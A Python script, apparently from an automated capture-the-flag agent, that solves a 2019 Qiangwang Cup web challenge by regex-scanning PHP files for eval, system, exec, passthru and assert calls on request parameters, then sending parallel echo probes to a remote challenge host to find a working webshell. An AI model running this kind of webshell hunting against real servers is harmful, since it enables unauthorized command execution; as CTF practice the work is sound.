import requests
import os
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

base_url = "http://b821ac5b-b6be-47ba-8e31-a1b10f4f407d.node5.buuoj.cn:81"
src_dir = '/home/lls/data/ctf-agent/challenges/154_强网杯_2019_高明的黑客/src'

# 收集所有可能的webshell
shells = []

for filename in os.listdir(src_dir):
    if not filename.endswith('.php'):
        continue
    filepath = os.path.join(src_dir, filename)
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        # 找所有危险函数调用
        func_pattern = r"(eval|system|exec|shell_exec|passthru|assert)\s*\(\s*\$_(GET|POST|REQUEST)\['([^']+)'\]"
        for match in re.finditer(func_pattern, content):
            func = match.group(1)
            method = match.group(2)
            param = match.group(3)
            shells.append((filename, func, method, param))
    except:
        pass

print(f"Total shells to test: {len(shells)}")

found = threading.Event()
result_lock = threading.Lock()

def test_shell(shell_info):
    if found.is_set():
        return None
    
    filename, func, method, param = shell_info
    url = f"{base_url}/src/{filename}"
    
    try:
        if method == 'GET':
            if func in ['system', 'exec', 'passthru', 'shell_exec']:
                r = requests.get(url, params={param: 'echo "SHELL_TEST_SUCCESS";'}, timeout=2)
                if 'SHELL_TEST_SUCCESS' in r.text:
                    return (filename, func, method, param, 'GET')
            elif func in ['eval', 'assert']:
                r = requests.get(url, params={param: 'echo "SHELL_TEST_SUCCESS";'}, timeout=2)
                if 'SHELL_TEST_SUCCESS' in r.text:
                    return (filename, func, method, param, 'GET')
        else:  # POST
            if func in ['system', 'exec', 'passthru', 'shell_exec']:
                r = requests.post(url, data={param: 'echo "SHELL_TEST_SUCCESS";'}, timeout=2)
                if 'SHELL_TEST_SUCCESS' in r.text:
                    return (filename, func, method, param, 'POST')
            elif func in ['eval', 'assert']:
                r = requests.post(url, data={param: 'echo "SHELL_TEST_SUCCESS";'}, timeout=2)
                if 'SHELL_TEST_SUCCESS' in r.text:
                    return (filename, func, method, param, 'POST')
    except:
        pass
    return None

# 使用线程池并行测试
with ThreadPoolExecutor(max_workers=50) as executor:
    futures = {executor.submit(test_shell, shell): shell for shell in shells}
    completed = 0
    for future in as_completed(futures):
        completed += 1
        if completed % 500 == 0:
            print(f"Completed: {completed}/{len(shells)}")
        
        result = future.result()
        if result:
            found.set()
            print(f"\n[SUCCESS] {result[0]}: {result[1]}($_{result[2]}['{result[3]}'])")
            # 取消所有未完成的任务
            for f in futures:
                f.cancel()
            break

print("Test completed.")
